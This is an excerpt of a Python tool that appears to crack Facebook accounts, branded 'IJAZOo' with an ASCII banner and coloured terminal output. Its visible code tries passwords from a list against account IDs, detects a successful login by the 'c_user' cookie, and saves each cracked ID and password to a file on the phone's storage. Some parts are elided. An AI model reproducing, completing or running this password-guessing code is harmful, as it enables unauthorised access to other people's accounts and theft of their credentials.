...
`7MMF'  `7MMF'    db      MMM"""AMV 
  MM      MM     ;MM:     M'   AMV  
  MM      MM    ,V^MM.    '   AMV   
  MM      MM   ,M  `MM       AMV    
  MM      MM   AbmmmqMA     AMV   , 
  MM (O)  MM  A'     VML   AMV   ,M 
.JMML.Ymmm9 .AMA.   .AMMA.AMVmmmmMM
\033[1;32m
\033[1;35m
\033[1;35m
...
\033[1;32m     \033[1;32mFACEBOK      : \033[96;1m IJAZ\____😘😈😘
...
\033[1;37m================= \33[32;45mIJAZOo\33[0;m =====================

       \33[37;41m\t WELLCOME TO IJAZOo TOOL\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/IJAZ-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s[IJAZ] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
